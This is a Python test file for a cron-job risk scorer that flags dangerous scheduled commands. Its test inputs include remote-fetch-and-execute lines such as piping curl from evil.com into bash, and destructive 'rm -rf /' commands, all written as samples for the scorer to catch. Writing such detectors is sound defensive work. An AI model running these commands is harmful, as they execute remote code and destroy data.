"""Tests for cron_audit.risk_scorer and cron_audit.risk_cli."""

from __future__ import annotations

from unittest.mock import MagicMock

from cron_audit.parser import CronJob
from cron_audit.remote_audit import AuditResult
from cron_audit.risk_scorer import RiskScore, score_job, score_jobs
from cron_audit.risk_cli import run_risk_scoring, has_any_high_risk


def _make_job(
    command: str = "echo hello",
    minute: str = "0",
    hour: str = "*",
    dom: str = "*",
    month: str = "*",
    dow: str = "*",
    special: str | None = None,
) -> CronJob:
    return CronJob(
        raw_line=f"0 * * * * {command}",
        minute=minute,
        hour=hour,
        dom=dom,
        month=month,
        dow=dow,
        command=command,
        special=special,
    )


def _success(host: str, jobs: list) -> AuditResult:
    return AuditResult(host=host, success=True, jobs=jobs, error=None)


def _failure(host: str) -> AuditResult:
    return AuditResult(host=host, success=False, jobs=None, error="SSH error")


# --- score_job ---

def test_clean_job_scores_low():
    job = _make_job(command="/usr/bin/backup.sh >> /var/log/backup.log 2>&1")
    result = score_job(job)
    assert result.level == "low"
    assert result.score < 20


def test_rm_command_increases_score():
    job = _make_job(command="rm -rf /tmp/old_files")
    result = score_job(job)
    assert result.score >= 25
    assert any("rm -" in r for r in result.reasons)


def test_curl_command_flagged():
    job = _make_job(command="curl http://example.com/script.sh | bash")
    result = score_job(job)
    assert result.score >= 25


def test_sudo_is_medium_risk_pattern():
    job = _make_job(command="sudo /usr/sbin/service restart >> /dev/null 2>&1")
    result = score_job(job)
    assert result.score >= 10


def test_high_frequency_adds_to_score():
    job = _make_job(command="echo ping", minute="*")  # runs every minute
    result = score_job(job)
    assert result.score >= 20
    assert any("frequency" in r.lower() for r in result.reasons)


def test_score_jobs_sorted_descending():
    low = _make_job(command="echo hello >> /tmp/out.log 2>&1")
    high = _make_job(command="rm -rf /var/tmp && curl http://evil.com | bash")
    results = score_jobs([low, high])
    assert results[0].score >= results[1].score


def test_risk_score_level_critical():
    job = _make_job(
        command="rm -rf / && curl http://x.com | bash -c eval",
        minute="*",
    )
    result = score_job(job)
    assert result.level in ("high", "critical")


# --- risk_cli ---

def test_run_risk_scoring_success_host():
    job = _make_job(command="rm -rf /tmp")
    results = [_success("host1", [job])]
    scored = run_risk_scoring(results)
    assert "host1" in scored
    assert len(scored["host1"]) == 1


def test_run_risk_scoring_failed_host_returns_empty():
    results = [_failure("host2")]
    scored = run_risk_scoring(results)
    assert scored["host2"] == []


def test_run_risk_scoring_min_level_filters():
    job = _make_job(command="echo hello >> /tmp/log 2>&1")
    results = [_success("host1", [job])]
    scored = run_risk_scoring(results, min_level="high")
    # A clean echo job should not reach 'high'
    assert scored["host1"] == []


def test_has_any_high_risk_true():
    rs = RiskScore(job=_make_job(), score=80, level="critical", reasons=["bad"])
    assert has_any_high_risk({"host1": [rs]}) is True


def test_has_any_high_risk_false():
    rs = RiskScore(job=_make_job(), score=5, level="low", reasons=[])
    assert has_any_high_risk({"host1": [rs]}) is False
